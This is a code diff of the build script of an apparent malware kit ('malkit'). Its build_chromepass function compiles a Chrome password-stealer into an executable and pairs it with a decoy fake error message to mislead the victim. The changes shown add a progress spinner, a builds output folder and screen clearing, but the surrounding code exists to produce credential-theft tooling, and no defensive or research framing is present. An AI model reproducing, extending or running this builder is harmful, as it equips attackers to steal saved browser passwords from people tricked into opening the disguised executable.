@@ -3,6 +3,8 @@ import argparse
 import sys
 import os
 import time
+
+from progress.spinner import Spinner
 from darkarp.malkit_modules import build
 # from testing import build
 
@@ -109,10 +111,14 @@ def build_chromepass(args):
         if not args.no_error:
             if args.errormsg:
                 error_msg = args.errormsg
+                sys.argv.pop()
+                sys.argv.pop()
             else:
                 error_msg = CONFIG["CHROMEPASS"]["errormsg"]
+
             with open(errorfile, "r") as f:
                 error_pre = f.read()
+
             error_final = error_pre.replace("<<ERRORMSG>>", error_msg)
             error_final = error_final.replace("<<TITLE>>", "Error")
         else:
@@ -130,7 +136,15 @@ def build_chromepass(args):
             f.write(cp_final)
         # Build the Executable and clean
         build.exebuild(target=filename, include='',
-                       output=output, icon=icon)
+                       output=f"builds/{output}", icon=icon)
+        spinner = Spinner("Finalizing build...")
+        for i in range(10):
+            time.sleep(0.1)
+            spinner.next()
+        print("\n[+] Done")
+        time.sleep(1)
+        os.system("cls")
+        print("You can locate the generated file in the builds folder.")
 
         try:
             os.remove(filename)
